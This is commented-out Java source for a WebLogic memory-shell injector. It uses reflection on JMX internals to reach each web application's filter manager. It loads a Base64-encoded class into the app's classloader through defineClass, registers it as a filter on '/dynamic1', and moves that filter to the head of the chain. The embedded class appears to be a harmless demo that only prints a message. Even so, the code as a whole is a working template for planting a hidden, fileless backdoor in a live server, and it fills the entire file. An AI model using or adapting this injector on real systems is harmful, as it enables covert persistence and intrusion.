//package com.memshell.weblogic;
//
//import com.sun.jmx.mbeanserver.NamedObject;
//import com.sun.jmx.mbeanserver.Repository;
//import sun.misc.BASE64Decoder;
//import weblogic.servlet.utils.ServletMapping;
//import weblogic.utils.collections.MatchMap;
//import javax.management.MBeanServer;
//import javax.management.ObjectName;
//import javax.naming.InitialContext;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.util.*;
//
//public class FilterBasedWithoutRequestTypeA extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        try{
//            InitialContext ctx = new InitialContext();
//            MBeanServer server = (MBeanServer)ctx.lookup("java:comp/env/jmx/runtime");
//
//            Field field = server.getClass().getDeclaredField("wrappedMBeanServer");
//            field.setAccessible(true);
//            Object obj = field.get(server);
//
//            field = obj.getClass().getDeclaredField("mbsInterceptor");
//            field.setAccessible(true);
//            obj = field.get(obj);
//
//            field = obj.getClass().getDeclaredField("repository");
//            field.setAccessible(true);
//            Repository repository = (Repository)field.get(obj);
//
//            // 这里的 query 参数会被忽略，所以直接用 null
//            Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"),null);
//            for(NamedObject namedObject : namedObjects){
//                String name = (String) namedObject.getObject().getAttribute("Name");
//                if(name.equals("bea_wls_internal") || name.equals("mejb") ||
//                        (name.contains("bea") && name.contains("wls"))) continue;
//
//                System.out.println("[Name] " + namedObject.getObject().getAttribute("Name"));
//
//                field = namedObject.getObject().getClass().getDeclaredField("managedResource");
//                field.setAccessible(true);
//                obj = field.get(namedObject.getObject());
//
//                field = obj.getClass().getSuperclass().getDeclaredField("children");
//                field.setAccessible(true);
//                HashSet set = (HashSet)field.get(obj);
//
//                for(Object o : set){
//                    if(o.getClass().getName().endsWith("WebAppRuntimeMBeanImpl")){
//                        field = o.getClass().getDeclaredField("context");
//                        field.setAccessible(true);
//                        Object context = field.get(o);
//
//                        Method getFilterManagerMethod = context.getClass().getDeclaredMethod("getFilterManager");
//                        Object filterManager = getFilterManagerMethod.invoke(context);
//
//                        field = filterManager.getClass().getDeclaredField("filters");
//                        field.setAccessible(true);
//                        HashMap filters = (HashMap) field.get(filterManager);
//
//                        // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
//                        if (!filters.containsKey("dynamic1")) {
//                            // 防止存在多个 context 导致重复加载类造成的异常
//                            try{
//                                Class.forName("com.memshell.generic.DynamicFilterTemplate");
//                            }catch(ClassNotFoundException e){
//                                System.out.println("[+] 添加动态 Filter...");
//                                BASE64Decoder base64Decoder = new BASE64Decoder();
//                                String codeClass = "yv66vgAAADIAMgoABgAhCQAiACMIACQKACUAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwAqAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwArAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAC9EeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YSBmcm9tIElucHV0RmlsZU9iamVjdAwACAAJBwAsDAAtAC4BAClJJ20gRmlsdGVyIEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcALwwAMAAxAQAqY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAAEAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAABgAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAAA1AAAAAgAAAAGxAAAAAgALAAAABgABAAAACwAMAAAAFgACAAAAAQANAA4AAAAAAAEAEQASAAEAEwAAAAQAAQAUAAEAFQAWAAIACgAAAFUAAgAEAAAACbIAAhIDtgAEsQAAAAIACwAAAAoAAgAAABUACAAWAAwAAAAqAAQAAAAJAA0ADgAAAAAACQAXABgAAQAAAAkAGQAaAAIAAAAJABsAHAADABMAAAAGAAIAHQAUAAEAHgAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAbAAwAAAAMAAEAAAABAA0ADgAAAAEAHwAAAAIAIA==";
//                                byte[] bytes = base64Decoder.decodeBuffer(codeClass);
//
//                                Field classLoaderField = context.getClass().getDeclaredField("classLoader");
//                                classLoaderField.setAccessible(true);
//                                ClassLoader cl = (ClassLoader) classLoaderField.get(context);
//                                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                                defineClass.setAccessible(true);
//                                defineClass.invoke(cl, bytes, 0, bytes.length);
//                            }
//
//                            //将 Filter 注册进 FilterManager
//                            //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
//                            Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
//                            registerFilterMethod.setAccessible(true);
//                            registerFilterMethod.invoke(filterManager, "dynamic1", "com.memshell.generic.DynamicFilterTemplate", new String[]{"/dynamic1"}, null, null, null);
//
//                            //将我们添加的 Filter 移动到 FilterChian 的第一位
//                            Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
//                            filterPatternListField.setAccessible(true);
//                            ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);
//
//                            //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
//                            for(int i = 0; i < filterPatternList.size(); i++){
//                                Object filterPattern = filterPatternList.get(i);
//                                Field f = filterPattern.getClass().getDeclaredField("map");
//                                f.setAccessible(true);
//                                ServletMapping mapping = (ServletMapping) f.get(filterPattern);
//
//                                f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
//                                f.setAccessible(true);
//                                MatchMap matchMap = (MatchMap)f.get(mapping);
//
//                                Object result = matchMap.match("/dynamic1");
//                                if(result != null && result.toString().contains("/dynamic1")){
//                                    Object temp = filterPattern;
//                                    filterPatternList.set(i, filterPatternList.get(0));
//                                    filterPatternList.set(0, temp);
//                                    break;
//                                }
//                            }
//                        }
//                    }
//                }
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
//}